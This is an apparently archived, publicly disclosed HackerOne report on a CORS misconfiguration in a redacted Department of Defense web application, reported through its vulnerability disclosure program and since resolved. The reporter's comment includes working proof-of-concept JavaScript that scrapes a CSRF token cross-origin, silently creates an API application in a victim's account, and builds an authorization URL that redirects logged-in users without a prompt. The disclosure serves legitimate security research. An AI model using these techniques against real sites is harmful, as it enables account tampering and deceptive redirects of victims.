---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
date: 2020-05-14
submitted: 2019-11-09T08:40:47.807Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "roethke"
source: "https://hackerone.com/reports/733017"
title: "CORS Misconfiguration Leads to Exposing User Data"
---
# CORS Misconfiguration Leads to Exposing User Data

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-05-14

- Report: [https://hackerone.com/reports/733017](https://hackerone.com/reports/733017)
- CWE: Improper Access Control - Generic
- Submitted: 2019-11-09T08:40:47.807Z

## Timeline

- **Report Filed**
- **2019-11-09** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **2019-11-10** @roethke: *NOTE: The above vulnerability was also found present on the immediate parent subdomain. It was originally thought that the IP of this subdomain would be shared with its parent, https://████/██████████, however that was discovered to be incorrect; therefore, a separate report can be created since the DNS is configured in such a way to give this subdomain a unique IP.*

As a result, it is unclear whether a code fix for this report would also fix the parent subdomain. Please let me know if you'd like for me to create a separate report.

**Unique IPs:**
*https://██████████/████████:*
███████

*https://███████/█████████:*
███████
- **2019-11-10** @roethke: Continuing to leverage this vulnerability (demonstrated on https://███████/███), we are able to:
 1. create an API application
 2. the resulting creation of an API application will allow us to craft a malicious link that we can send to our victim in order to perform an open redirect to a domain of our choosing

*Upon reviewal of the API documentation, we find the ability to redirect a logged-in user to _any_ domain following the below URL format*

██████████

**Crafting the Malicious URL:**
- Leveraging the poor access control above we are able to visit https://████/████████/api/application/list
- If the user already has an application they've created we can skip the application creation portion of this report (which is the majority) and jump right to performing the redirect
- If they have not already created an application, we can create one for them by leveraging the `/████/api/application/add` endpoint
- We obtain the CSRF token present in the source code of this endpoint and send it along with the payload to create an API application
████
- After successful creation of the API application, we obtain the Client ID (required for the redirect)
- We then modify the `response_type` query parameter value shown in the original redirect documentation so that we are able to bypass a page prompting the user to authorize the API, ensuring fluid redirect execution and avoiding tipping off the user to the impending detour

████
^ We would like to *silently* authorize waymobetta

**PoCs:**

*API_Creation_POC.html*
```html
<html>
	<script>
		var xhr = new XMLHttpRequest();
		xhr.onload = handleResponse;
		xhr.open('get', 'https://██████████/███████/api/application/add', true);
		xhr.withCredentials = true;
		xhr.send();
		function handleResponse() {
			var token = this.responseText.match("name='csrfmiddlewaretoken' value=(.*)? />")[1].trim()
			var token_stripped = token.substring(0,token.length -1).substring(1)
			var createApp = new XMLHttpRequest();
			createApp.open('post', 'https://██████/█████/api/application/add', true);
			createApp.withCredentials = true;
			createApp.setRequestHeader("Content-type","application/x-www-form-urlencoded")
            var payload = 'csrfmiddlewaretoken='+token_stripped+'&authorization_grant_type=authorization-code&name=waymobetta&client_type=confidential&redirect_uris=https%3A%2F%2F████'
            createApp.send(payload);
		};
	</script>
</html>
```

*List_API_Applications_POC.html:*
```html
<html>
<script>
function cors() {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://████████/█████████/api/application/list", true);
  xhr.withCredentials = true;
  xhr.send(null);
}
</script>
</html>
```

We can then pull the *Client ID* from the above POC response and use it to craft our malicious redirect URL.

When visited, this link will automatically redirect our logged-in victim to any domain. In this case, https://█████████
```
https://████████/████/api/authorize?response_type=&client_id=███&redirect_uri=https://████████
```

**Demos:**
*API Application Creation:*
███

*List API Applications:*
████████

*Redirect:*
████████

---

Overall quite a lot of work to craft a simple URL that will redirect a *logged-in* victim to any webpage.. but the point here is that by continuing to leverage the original CORS misconfiguration we can rain down further annoyance- and potentially exploitation too- on our victim user.
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
